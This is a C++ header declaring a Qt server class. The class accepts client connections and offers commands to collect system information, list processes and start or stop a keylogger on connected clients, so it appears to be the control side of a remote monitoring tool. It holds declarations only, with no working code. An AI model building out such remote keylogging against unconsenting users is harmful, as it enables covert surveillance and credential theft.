#ifndef SERVERAPP_HPP
#define SERVERAPP_HPP

#include "../utils/EnvLoader.hpp"
#include "../utils/LPTF/LPTF_Socket.hpp"
#include "../utils/LPTF/LPTF_Packet.hpp"

#include "database/Postgres.hpp"

#include <vector>
#include <memory>
#include <string>
#include <iostream>
#include <cstring>
#include <QString>
#include <QObject>
#include <QDebug>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/select.h>
#endif

class ServerApp : public QObject
{
    Q_OBJECT
public:
    explicit ServerApp(const std::string &envFilePath);
    ~ServerApp();

    void run();

signals:
    void clientConnected(const QString &clientInfo, uint32_t sessionId);
    void clientResponse(const QString &clientInfo, const QString &text);

public slots:
    void onGetInfoSys(const QString &clientId);
    void onStartKeylogger(const QString &clientId);
    void onStopKeylogger(const QString &clientId);
    void onRequestProcessList(const QString &clientId, bool namesOnly);
    void onSendToClient(const QString &clientInfo, const QByteArray &data);

private:
    // Internal helper to send raw data to client by clientId string
    void sendToClientInternal(const QString &clientId, const QByteArray &data);

    // Helper pieces used by run() to keep it short:
    void prepareFdSet(fd_set &readfds, int &maxFd, int &listenFd);
    void acceptNewClientIfAny(const fd_set &readfds, int listenFd);
    void processClient(size_t &idx, const fd_set &readfds, uint32_t &nextSessionId);

    LPTF_Socket m_serverSocket;
    std::vector<std::unique_ptr<LPTF_Socket>> m_clients;
    std::vector<std::string> m_clientUsers;
    std::string m_envFilePath;
    Postgres m_dbManager;
};

#endif // SERVERAPP_HPP
